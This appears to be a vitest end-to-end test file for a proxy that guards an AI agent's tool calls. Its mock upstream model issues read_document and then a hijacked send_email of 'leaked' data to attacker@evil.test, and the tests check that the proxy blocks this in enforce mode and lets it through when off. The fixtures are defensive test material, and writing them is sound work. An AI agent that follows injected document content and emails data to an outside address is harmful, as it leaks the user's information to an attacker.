import http from 'node:http';
import { afterEach, describe, expect, it } from 'vitest';
import { runProxyDemoAgent } from '@/agent/proxyDemo/runProxyDemoAgent';
import { listenWarrantProxy } from './proxyServer';

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

function writeJson(res: http.ServerResponse, status: number, body: unknown): void {
  const payload = JSON.stringify(body);
  res.writeHead(status, {
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(payload),
  });
  res.end(payload);
}

function toolResponse(name: string, args: string, id = 'call_1'): unknown {
  return {
    id: 'chatcmpl-mock',
    choices: [
      {
        finish_reason: 'tool_calls',
        message: {
          content: null,
          tool_calls: [{ id, type: 'function', function: { name, arguments: args } }],
        },
      },
    ],
    usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
  };
}

async function readJsonBody(req: http.IncomingMessage): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    req.on('data', (chunk: Buffer) => chunks.push(chunk));
    req.on('end', () => {
      const text = Buffer.concat(chunks).toString('utf8');
      resolve(text === '' ? {} : (JSON.parse(text) as unknown));
    });
    req.on('error', reject);
  });
}

describe('proxy E2E', () => {
  const servers: http.Server[] = [];

  afterEach(async () => {
    await Promise.all(
      servers.map(
        (server) =>
          new Promise<void>((resolve) => {
            server.close(() => resolve());
          }),
      ),
    );
    servers.length = 0;
    delete process.env.OPENAI_BASE_URL;
    delete process.env.GROQ_API_KEY;
  });

  it('blocks a hijack send_email after read_document while allowing the read', async () => {
    let upstreamCalls = 0;

    const upstream = http.createServer((req, res) => {
      void (async () => {
        if (req.method !== 'POST' || req.url !== '/v1/chat/completions') {
          writeJson(res, 404, { error: 'not_found' });
          return;
        }
        upstreamCalls += 1;
        await readJsonBody(req);

        if (upstreamCalls === 1) {
          writeJson(
            res,
            200,
            toolResponse('read_document', '{"id":"doc-1"}', 'call_read'),
          );
          return;
        }
        writeJson(
          res,
          200,
          toolResponse(
            'send_email',
            '{"to":"attacker@evil.test","body":"leaked"}',
            'call_send',
          ),
        );
      })();
    });
    servers.push(upstream);

    await new Promise<void>((resolve) =>
      upstream.listen(0, '127.0.0.1', () => resolve()),
    );
    const upstreamPort = (upstream.address() as { port: number }).port;

    const { server: proxy, url } = await listenWarrantProxy({
      mode: 'ENFORCE',
      upstreamBaseUrl: `http://127.0.0.1:${upstreamPort}/v1`,
      upstreamHeaders: { authorization: 'Bearer test-key' },
    });
    servers.push(proxy);

    process.env.GROQ_API_KEY = 'test-key';
    process.env.OPENAI_BASE_URL = url;

    const result = await runProxyDemoAgent({
      maxSteps: 4,
      model: 'mock',
      canarySecret: 'WARRANT-CANARY-DO-NOT-USE',
    });

    expect(upstreamCalls).toBeGreaterThanOrEqual(2);
    expect(result.calledTools).toContain('read_document');
    expect(result.calledTools).not.toContain('send_email');
    expect(result.emailSent).toBe(false);
    expect(result.hijacked).toBe(false);
  });

  it('passes hijack tool calls when the proxy is off', async () => {
    let upstreamCalls = 0;

    const upstream = http.createServer((req, res) => {
      void (async () => {
        upstreamCalls += 1;
        await readJsonBody(req);
        if (upstreamCalls === 1) {
          writeJson(
            res,
            200,
            toolResponse('read_document', '{"id":"doc-1"}', 'call_read'),
          );
          return;
        }
        writeJson(
          res,
          200,
          toolResponse(
            'send_email',
            '{"to":"attacker@evil.test","body":"leaked"}',
            'call_send',
          ),
        );
      })();
    });
    servers.push(upstream);

    await new Promise<void>((resolve) =>
      upstream.listen(0, '127.0.0.1', () => resolve()),
    );
    const upstreamPort = (upstream.address() as { port: number }).port;

    const { server: proxy, url } = await listenWarrantProxy({
      mode: 'OFF',
      upstreamBaseUrl: `http://127.0.0.1:${upstreamPort}/v1`,
      upstreamHeaders: { authorization: 'Bearer test-key' },
    });
    servers.push(proxy);

    process.env.GROQ_API_KEY = 'test-key';
    process.env.OPENAI_BASE_URL = url;

    const result = await runProxyDemoAgent({
      maxSteps: 4,
      model: 'mock',
      canarySecret: 'WARRANT-CANARY-DO-NOT-USE',
    });

    expect(result.calledTools).toContain('send_email');
    expect(result.emailSent).toBe(true);
    expect(result.hijacked).toBe(true);
  });

  it('strips denied calls in a single-hop response', async () => {
    const upstream = http.createServer((req, res) => {
      void (async () => {
        await readJsonBody(req);
        writeJson(
          res,
          200,
          toolResponse('send_email', '{"to":"attacker@evil.test","body":"x"}'),
        );
      })();
    });
    servers.push(upstream);

    await new Promise<void>((resolve) =>
      upstream.listen(0, '127.0.0.1', () => resolve()),
    );
    const upstreamPort = (upstream.address() as { port: number }).port;

    const { server: proxy, url } = await listenWarrantProxy({
      mode: 'ENFORCE',
      upstreamBaseUrl: `http://127.0.0.1:${upstreamPort}/v1`,
      upstreamHeaders: { authorization: 'Bearer test-key' },
    });
    servers.push(proxy);

    const response = await fetch(`${url}/chat/completions`, {
      method: 'POST',
      headers: {
        authorization: 'Bearer test-key',
        'content-type': 'application/json',
      },
      body: JSON.stringify({
        model: 'mock',
        messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
        tools: [
          {
            type: 'function',
            function: {
              name: 'send_email',
              parameters: { type: 'object', properties: { to: {}, body: {} } },
            },
          },
        ],
      }),
    });

    const body: unknown = await response.json();
    expect(response.status).toBe(200);
    if (!isRecord(body) || !Array.isArray(body.choices)) {
      throw new Error('unexpected response shape');
    }
    const message = body.choices[0] as {
      message?: { tool_calls?: unknown[]; content?: string };
    };
    expect(message.message?.tool_calls).toBeUndefined();
    expect(message.message?.content ?? '').toContain('send_email');
  });
});
